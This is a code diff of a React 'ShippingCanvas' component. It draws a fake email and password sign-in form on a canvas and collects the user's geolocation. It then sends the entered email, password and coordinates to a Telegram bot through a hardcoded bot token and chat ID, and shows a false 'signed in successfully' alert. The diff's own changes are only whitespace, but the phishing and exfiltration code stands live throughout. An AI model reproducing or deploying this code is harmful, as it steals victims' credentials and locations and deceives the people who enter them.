@@ -26,10 +26,9 @@ const ShippingCanvas = () => {
     const buttonY = 512;
     const buttonWidth = 150;
     const buttonHeight = 50;
-
+    
     ctx.strokeRect(emailX, emailY, 430, 30);
     ctx.strokeRect(passwordX, passwordY, 430, 30);
-
     setInputBox(emailInputRef.current, emailX, emailY, 430, 30);
     setInputBox(passwordInputRef.current, passwordX, passwordY, 430, 30);
 
@@ -40,9 +39,7 @@ const ShippingCanvas = () => {
         handleSubmit();
       }
     };
-
     canvasRef.current.addEventListener('click', handleCanvasClick);
-
     return () => {
       canvasRef.current.removeEventListener('click', handleCanvasClick);
     };
@@ -70,15 +67,15 @@ const ShippingCanvas = () => {
         (position) => {
           const { latitude, longitude } = position.coords;
           setGeoData({ latitude, longitude });
-
           // Send data to Telegram bot
           const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
           const chatId = '6707519229';
           const message = `📨 **Email:** ${email}
-            🔑 **Password:** ${password}
-            📍 **Latitude:** ${latitude}
-            📍 **Longitude:** ${longitude}`;
+                           🔑 **Password:** ${password}
+                           📍 **Latitude:** ${latitude}
+                           📍 **Longitude:** ${longitude}`;
           const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+          
           const response = await fetch(telegramUrl);
           if (response.ok) {
             alert('You have signed in successfully');
